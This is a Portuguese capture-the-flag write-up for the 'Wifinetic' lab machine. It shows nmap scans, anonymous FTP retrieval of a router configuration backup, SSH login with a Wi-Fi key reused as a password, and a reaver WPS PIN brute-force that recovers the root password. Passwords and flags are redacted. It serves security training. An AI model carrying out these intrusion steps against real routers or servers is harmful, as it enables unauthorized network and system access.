#ctfs 

![Capa do CTF Wifinetic](Imagens/Pasted%20image%2020261016125349.png)



| Dado Fornecido | Valor         |
| -------------- | ------------- |
| IP             | 10.129.229.90 |

# Reconhecimento inicial

Primeiro começamos com um scan `nmap` no IP fornecido

```shell
└─$ nmap 10.129.229.90 -Pn --open -p-                     
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-16 12:55 -03
Nmap scan report for 10.129.229.90
Host is up (0.13s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain

Nmap done: 1 IP address (1 host up) scanned in 44.18 seconds
```

Diante das 3 portas abertas, podemos aprofundar um pouco mais nosso escaneamento

```shell
└─$ nmap 10.129.229.90 -Pn --open -p 21,22,53 -sVC
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-16 12:57 -03
Nmap scan report for 10.129.229.90
Host is up (0.21s latency).

PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.17.151
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.82 seconds
```

Resultado muito interessante, temos algumas pastas acessíveis no login anônimo do FTP, podemos começar agora nossa enumeração

# Enumeração

## FTP

Após baixar tudo via login anônimo podemos ler individualmente o que significa cada arquivo fornecido.

Após rápida leitura nos arquivos descobrimos tais informações neles contidas:

### ProjectOpenWRT.pdf

Email: management@wifinetic.htb
Sistema operacional antigo: OpenWRT
Novo: Debian
Nome e email de funcionário: Oliver Walke, olivia.walker17@wifinetic.htb

### ProjectGreatMigration.pdf

Email: info@wifinetic.htb

### employees_wellness.pdf

Email: all_employees@wifinetic.htb
Nome e email de funcionária: Samantha Wood, samantha.wood93@wifinetic.ht

### OpenWrt.txt 

Era apenas um checklist do que fazer após configurar a mudança de SO.

### backup-OpenWrt-2023-07-26.tar

O arquivo de backup da `/etc` é interessante. Ao analisarmos com calma encontramos alguns dados relevantes conforme expostos abaixo

`/etc/passwd`

```shell
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
```

Temos um usuário chamado `netadmin`

`/etc/config/wireless`

```shell
config wifi-device 'radio0'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim0'
        option cell_density '0'
        option channel 'auto'
        option band '2g'
        option txpower '20'

config wifi-device 'radio1'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim1'
        option channel '36'
        option band '5g'
        option htmode 'HE80'
        option cell_density '0'

config wifi-iface 'wifinet0'
        option device 'radio0'
        option mode 'ap'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key '[senha netadmin]'
        option wps_pushbutton '1'

config wifi-iface 'wifinet1'
        option device 'radio1'
        option mode 'sta'
        option network 'wwan'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key '[senha netadmin]'
```

Observe que no campo `option key` temos uma senha em texto claro. Podemos testar no SSH

## SSH

```shell
└─$ ssh netadmin@10.129.229.90
The authenticity of host '10.129.229.90 (10.129.229.90)' can't be established.
ED25519 key fingerprint is: SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.229.90' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
netadmin@10.129.229.90's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 16 Oct 2026 04:30:05 PM UTC

  System load:            0.0
  Usage of /:             64.5% of 4.76GB
  Memory usage:           6%
  Swap usage:             0%
  Processes:              226
  Users logged in:        0
  IPv4 address for eth0:  10.129.229.90
  IPv6 address for eth0:  dead:beef::a0de:adff:fea0:e276
  IPv4 address for wlan0: 192.168.1.1
  IPv4 address for wlan1: 192.168.1.23

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Sep 12 12:46:00 2023 from 10.10.14.23
netadmin@wifinetic:~$ 
```

Funcionou! Basta agora lermos a user.txt

```shell
netadmin@wifinetic:~$ cat user.txt
[flag user.txt]
```

# Escalação de Privilégios

Estamos numa máquina com indicação de que o caminho a ser seguido é o de redes, podemos começar verificando as interfaces de rede

```shell
netadmin@wifinetic:/etc/cron.daily$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.229.90  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::a0de:adff:fea0:e276  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::a0de:adff:fea0:e276  prefixlen 64  scopeid 0x0<global>
        ether a2:de:ad:a0:e2:76  txqueuelen 1000  (Ethernet)
        RX packets 108473  bytes 6701838 (6.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 83812  bytes 7355082 (7.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2648  bytes 158896 (158.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2648  bytes 158896 (158.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 61214  bytes 10778045 (10.7 MB)
        RX errors 0  dropped 61214  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 2049  bytes 193530 (193.5 KB)
        RX errors 0  dropped 281  overruns 0  frame 0
        TX packets 2376  bytes 275938 (275.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 599  bytes 83292 (83.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2049  bytes 230412 (230.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Temos `mon0`, `wlan0`, `wlan1` e `wlan2`, esse mon0 é interessante pois é um indicativo de um modo monitor na rede, próprio de ataques no Wi-Fi.

Vamos aprofundar nas redes wireless

```shell
netadmin@wifinetic:/usr/share/man/man8$ iw dev
phy#2
        Interface mon0
                ifindex 7
                wdev 0x200000002
                addr 02:00:00:00:02:00
                type monitor
                txpower 20.00 dBm
        Interface wlan2
                ifindex 5
                wdev 0x200000001
                addr 02:00:00:00:02:00
                type managed
                txpower 20.00 dBm
phy#1
        Unnamed/non-netdev interface
                wdev 0x1000000a2
                addr 42:00:00:00:01:00
                type P2P-device
                txpower 20.00 dBm
        Interface wlan1
                ifindex 4
                wdev 0x100000001
                addr 02:00:00:00:01:00
                ssid OpenWrt
                type managed
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm
phy#0
        Interface wlan0
                ifindex 3
                wdev 0x1
                addr 02:00:00:00:00:00
                ssid OpenWrt
                type AP
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm
```

Veja agora com mais detalhes, mon0 é uma interface virtual em modo monitor criada sobre o mesmo rádio físico de wlan2 (phy2)

Vamos a topologia:

```
                           SSID: OpenWrt
                           Canal: 1
                               │
             ┌─────────────────┼─────────────────┐
             │                 │                 │
       phy#0 / wlan0     phy#1 / wlan1     phy#2 / wlan2
          Access Point        Cliente          Outro rádio
             │                 │                 │
             │                 │                 └── mon0
             │                 │                     Monitor
             └──── conexão Wi‑Fi ────┘
```

### `wlan0`: access point

```
type AP
addr 02:00:00:00:00:00
ssid OpenWrt
channel 1
```

Ela desempenha o papel do roteador Wi‑Fi:

- anuncia a rede `OpenWrt`;
- transmite beacons;
- aceita associações de clientes;
- oferece os serviços de autenticação, incluindo WPS;
- seu MAC funciona como BSSID da rede.

Ou seja, é o nosso alvo

### `wlan1`: cliente

```
type managed
ssid OpenWrt
channel 1
```

O modo `managed` é o modo normal de uma placa conectada a um roteador. Ela desempenha o papel de um notebook ou celular conectado ao access point.

### `wlan2` e `mon0`: rádio de auditoria

`wlan2` pertence ao terceiro rádio, `phy#2`. Usou-se o `mon0`sobre o `phy#2` pois, dessa forma, não haverá interferência em `wlan0`e `wlan1`

### Reaver

Ao verificarmos as capabilities da máquina encontramos uma interessante

```shell
netadmin@wifinetic:/usr/share/man/man8$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

Temos um `Reaver`! Um software para força bruta do WPS. Podemos usá-lo a interface alvo (wlan0) a fim de verificar as mensagens WPS.

Vamos então passar no comando

```shell
netadmin@wifinetic:/usr/share/man/man8$ reaver -i mon0 -b 02:00:00:00:00:00 -vv

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Switching mon0 to channel 1
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: '[senha root]'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.
```

Ganhamos a senha do root, basta agora fazer login e capturar a flag

```shell
netadmin@wifinetic:/usr/share/man/man8$ su root
Password: 
root@wifinetic:/usr/share/man/man8# cat /root/root.txt
[flag root.txt]
```

